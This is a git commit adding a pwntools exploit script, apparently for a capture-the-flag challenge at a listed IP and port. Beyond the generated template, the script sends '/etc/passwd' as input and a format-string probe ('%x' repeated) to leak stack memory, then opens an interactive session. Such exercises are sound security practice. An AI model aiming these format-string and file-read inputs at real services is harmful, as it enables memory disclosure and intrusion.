64a395c5fd59486336f8246cdefa6bcc17d11516
JustBeYou <mihailferaru2000@gmail.com>
2018-11-28 13:50:29 +0200

    unknown/

---
+++ unknown/onechange.py
@@ -0,0 +1,63 @@
+#!/usr/bin/env python2
+# -*- coding: utf-8 -*-
+# This exploit template was generated via:
+# $ pwn template onechange --host 103.237.99.35 --port 26125
+from pwn import *
+
+# Set up pwntools for the correct architecture
+exe = context.binary = ELF('onechange')
+
+# Many built-in settings can be controlled on the command-line and show up
+# in "args".  For example, to dump all data sent/received, and disable ASLR
+# for all created processes...
+# ./exploit.py DEBUG NOASLR
+# ./exploit.py GDB HOST=example.com PORT=4141
+host = args.HOST or '103.237.99.35'
+port = int(args.PORT or 26125)
+
+def local(argv=[], *a, **kw):
+    '''Execute the target binary locally'''
+    if args.GDB:
+        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
+    else:
+        return process([exe.path] + argv, *a, **kw)
+
+def remote(argv=[], *a, **kw):
+    '''Connect to the process on the remote host'''
+    io = connect(host, port)
+    if args.GDB:
+        gdb.attach(io, gdbscript=gdbscript)
+    return io
+
+def start(argv=[], *a, **kw):
+    '''Start the exploit against the target.'''
+    if args.LOCAL:
+        return local(argv, *a, **kw)
+    else:
+        return remote(argv, *a, **kw)
+
+# Specify your GDB script here for debugging
+# GDB will be launched if the exploit is run via e.g.
+# ./exploit.py GDB
+gdbscript = '''
+break *0x{exe.symbols.main:x}
+continue
+'''.format(**locals())
+
+#===========================================================
+#                    EXPLOIT GOES HERE
+#===========================================================
+# Arch:     amd64-64-little
+# RELRO:    Partial RELRO
+# Stack:    No canary found
+# NX:       NX enabled
+# PIE:      PIE enabled
+
+io = start()
+
+io.sendline('/etc/passwd')
+io.sendline('2')
+io.sendline('AAAA ' + '%x ' * 25)
+
+io.interactive()
+
